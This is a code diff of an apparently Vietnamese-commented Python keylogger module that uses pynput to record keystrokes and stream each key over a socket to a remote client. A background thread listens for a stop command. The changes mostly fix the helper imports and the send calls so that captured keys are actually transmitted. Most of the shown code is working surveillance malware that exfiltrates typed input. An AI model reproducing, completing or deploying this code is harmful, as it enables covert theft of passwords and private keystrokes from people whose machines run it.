@@ -1,6 +1,8 @@
 from pynput import keyboard
 import threading
-from module_support import send_command_utf8, receive_response_utf8
+
+from CRUD import receive_response, send_command
+
 
 def start_keylogger(client_socket):
     keys_pressed = ""
@@ -35,7 +37,7 @@ def start_keylogger(client_socket):
 
         # Gửi dữ liệu phím nhấn qua client_socket
         try:
-            send_command_utf8(client_socket)          
+            send_command(client_socket, key_str)          
         except Exception as e:
             print(f'Loi gui du lieu den Client: {e}')
             return False  # Dừng keylogger nếu có lỗi khi gửi dữ liệu
@@ -44,7 +46,7 @@ def start_keylogger(client_socket):
     def listen_for_commands():
         nonlocal stop_keylogger
         try:
-            command = receive_response_utf8(client_socket)            
+            command = receive_response(client_socket)            
             if command == "STOP_KEYLOGGER":                    
                 print("\nClient yeu cau tat Keylogger")
                 stop_keylogger = True  # Đánh dấu dừng keylogger
@@ -68,4 +70,4 @@ def start_keylogger(client_socket):
     listener_thread.join()  # Chờ thread lắng nghe lệnh kết thúc
 
     listener.stop()  # Dừng listener
-    send_command_utf8("KEYLOGGER_STOPPED")
+    send_command(client_socket, "KEYLOGGER_STOPPED")
